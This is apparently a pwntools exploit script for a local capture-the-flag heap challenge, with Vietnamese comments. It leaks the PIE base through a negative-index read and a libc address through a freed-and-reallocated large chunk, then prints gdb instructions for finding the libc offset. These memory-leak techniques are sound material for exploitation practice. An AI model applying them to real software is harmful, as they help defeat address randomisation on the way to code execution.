from pwn import *

# ================= CONFIG =================
exe = ELF('./chal')
# KHÔNG load libc file ở đây vì ta đang chạy process local (dùng libc hệ thống)
context.binary = exe
context.terminal = ['tmux', 'splitw', '-h']

r = process('./chal')

# ================= HELPER =================
def create(idx, size, data):
    if isinstance(data, str): data = data.encode()
    r.sendlineafter(b': ', b'1')
    r.sendlineafter(b': ', str(idx).encode())
    r.sendlineafter(b': ', hex(size).encode())
    r.sendafter(b': ', data)

def delete(idx):
    r.sendlineafter(b': ', b'2')
    r.sendlineafter(b': ', str(idx).encode())

def view(idx):
    r.sendlineafter(b': ', b'3')
    r.sendlineafter(b': ', str(idx).encode())

# ================= LEAK =================
log.info("--- STEP 1: LEAK PIE ---")
view(-7)
r.recvuntil(b'data: ')
leak = r.recvline()[:-1]
val = u64(leak[:8].ljust(8, b'\0'))
pie_base = val - 0x4008 
if pie_base & 0xfff != 0: pie_base = val & ~0xfff
log.success(f"PIE Base: {hex(pie_base)}")

log.info("--- STEP 2: LEAK LIBC (HEAP) ---")
create(0, 0x500, b"A"*0x10) 
create(1, 0x20, b"B"*0x10)
delete(0)
create(0, 0x500, b"C"*8) 
view(0)
r.recvuntil(b'data: ')
d = r.recvline()[:-1]

libc_leak = u64(d[8:16].ljust(8, b'\0'))
log.info(f"RAW LIBC LEAK: {hex(libc_leak)}")

print("\n" + "="*40)
print(f"[*] PID: {r.pid}")
print("[*] HÃY MỞ TERMINAL KHÁC VÀ CHẠY: gdb -p " + str(r.pid))
print("[*] TRONG GDB GÕ: vmmap libc")
print("[*] LẤY 'RAW LEAK' TRỪ ĐI 'START ADDRESS' CỦA LIBC ĐỂ RA OFFSET.")
print("="*40 + "\n")

r.interactive()